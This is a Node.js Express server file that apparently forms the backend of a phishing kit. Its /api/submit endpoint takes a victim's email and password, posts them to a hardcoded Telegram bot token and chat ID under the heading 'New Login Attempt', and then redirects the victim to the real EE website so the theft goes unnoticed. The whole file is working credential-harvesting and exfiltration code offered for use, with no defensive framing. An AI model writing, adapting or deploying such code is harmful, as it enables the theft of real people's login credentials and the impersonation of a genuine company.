const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Telegram Bot API details
const telegramBotToken = '7614000884:AAG7X2RiKEet725g0_p0srbp525V70QVplc';
const chatId = '7587120060';

app.post('/api/submit', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({
                success: false,
                message: "Email and password are required."
            });
        }

        const message = `🔐 New Login Attempt\n\n📧 Email: ${email}\n🔑 Password: ${password}`;

        console.log("📨 Preparing to send message to Telegram...");
        console.log("Bot Token:", telegramBotToken);
        console.log("Chat ID:", chatId);
        console.log("Message:\n", message);

        const response = await axios.post(
            `https://api.telegram.org/bot ${telegramBotToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            },
            {
                validateStatus: () => true // Don't throw on HTTP errors
            }
        );

        console.log("📡 Telegram API Response Status:", response.status);
        console.log("📩 Telegram API Response Data:", response.data);

        if (!response.data.ok) {
            return res.status(502).json({
                success: false,
                message: "Telegram rejected the message.",
                error: response.data
            });
        }

        res.json({
            success: true,
            redirectUrl: 'https://ee.co.uk/ '
        });

    } catch (error) {
        console.error("🚨 ERROR:", error.message);

        if (error.response) {
            console.error("Telegram API Error Response:", error.response.data);
            return res.status(error.response.status || 500).json({
                success: false,
                message: "Telegram API returned an error.",
                error: error.response.data
            });
        }

        if (error.request) {
            console.error("No response from Telegram:", error.request);
            return res.status(504).json({
                success: false,
                message: "Timeout connecting to Telegram.",
                error: "No response from Telegram"
            });
        }

        res.status(500).json({
            success: false,
            message: "Internal server error.",
            error: error.message
        });
    }
});

module.exports = app;
